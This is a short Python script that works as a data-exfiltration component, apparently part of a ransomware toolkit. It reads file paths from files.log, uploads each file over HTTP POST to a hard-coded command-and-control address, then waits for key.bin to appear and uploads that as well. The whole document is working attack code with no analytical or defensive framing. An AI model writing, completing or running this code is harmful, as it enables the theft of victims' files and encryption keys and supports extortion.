import os
import requests
import time

def exfiltrate_file(file_path, url):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()

        headers = {
            'Filename': os.path.basename(file_path),
            'Content-Type': 'application/octet-stream'
        }

        response = requests.post(url, headers=headers, data=data)

        if response.status_code == 200:
            print(f"[+] Exfiltrated: {file_path}")
        else:
            print(f"[!] Failed to exfiltrate {file_path}: {response.status_code}")
    except Exception as e:
        print(f"[!] Error sending {file_path}: {e}")

def wait_for_key(key_path, timeout=60):
    print("[*] Waiting for key.bin to be generated...")
    elapsed = 0
    while not os.path.exists(key_path):
        time.sleep(1)
        elapsed += 1
        if elapsed >= timeout:
            print("[!] Timed out waiting for key.bin.")
            return False
    return True

def run_exfiltration(log_file="files.log", c2_url="http://192.168.1.18:8080"):
    if not os.path.exists(log_file):
        print("[-] files.log not found.")
        return

    with open(log_file, "r") as f:
        file_paths = f.readlines()

    for path in file_paths:
        filepath = path.strip()
        if os.path.exists(filepath):
            exfiltrate_file(filepath, c2_url)
        else:
            print(f"[-] Skipped missing file: {filepath}")

    # Wait and send key.bin
    key_path = "key.bin"
    if wait_for_key(key_path):
        exfiltrate_file(key_path, c2_url)

if __name__ == "__main__":
    run_exfiltration()
